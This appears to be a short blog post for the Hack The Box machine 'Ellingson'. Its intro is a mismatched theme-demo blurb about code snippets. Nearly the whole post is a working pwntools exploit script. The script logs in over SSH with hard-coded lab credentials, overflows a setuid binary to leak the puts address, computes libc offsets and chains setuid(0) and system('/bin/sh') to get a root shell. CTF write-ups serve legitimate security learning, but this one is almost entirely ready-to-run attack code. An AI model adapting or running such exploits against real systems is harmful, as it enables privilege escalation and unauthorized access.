---
layout: post
title: Hello Ellingson 
categories: [pwn, HackTheBox]
---

This post demonstrate the use of code snippets in the theme. The code snippets are powered by Pygments and the code theme that is been used in Reverie is called Draula.

The exploit:

```python
from pwn import *

s = ssh(host='10.10.10.139',user='margo',password='iamgod$08')
p = s.process('/usr/bin/garbage')

#p = process('./garbage')

context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

#  401050:	ff 25 d2 2f 00 00    	jmp    QWORD PTR [rip+0x2fd2]        # 404028 <puts@GLIBC_2.2.5>
plt_puts = p64(0x401050) # puts() --> puts@plt --> put@puts.got --> real_puts()
got_puts = p64(0x404028) # will resolve to actual puts address after dynamic linking (first trampoline)
pop_rdi = p64(0x40179b) # take topmost item on stack and load into RDI register. then ret = pop rip
main = p64(0x401619) # address of main

junk = 'A'*136 # (length of buffer) offset for RIP

payload = junk + pop_rdi + got_puts + plt_puts + main

#p.recvuntil("password: ")
p.sendline(payload)
p.recvuntil("denied.")
leaked_puts = p.recv()[:8].strip().ljust(8,'\x00')
log.success("Leaked puts@GLIBC: " + str(leaked_puts))
#log.success("Unpacked puts@GLIBC: "+ str(u64(leaked_puts)))
#p.interactive()
leaked_puts = u64(leaked_puts) # unpack raw 64bit value to int



# Stage 2.
pop_rdi = p64(0x40179b) # take topmost item on stack and load into RDI register. then ret = pop rip
libc_puts = 0x809c0 #0x71b80
libc_sys = 0x4f440 #0x44c50
libc_sh = 0x1b3e9a #0x181519
libc_setuid = 0xe5970 #0xc7840
zero_arg = p64(0)

offset = leaked_puts - libc_puts # get distance away we are from static libc_puts, this will be the same distance for all other libc items
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)
setuid = p64(offset + libc_setuid)

payload = junk + pop_rdi + zero_arg + setuid + pop_rdi + sh + sys

p.sendline(payload)
p.recvuntil("denied.")
p.interactive()
```
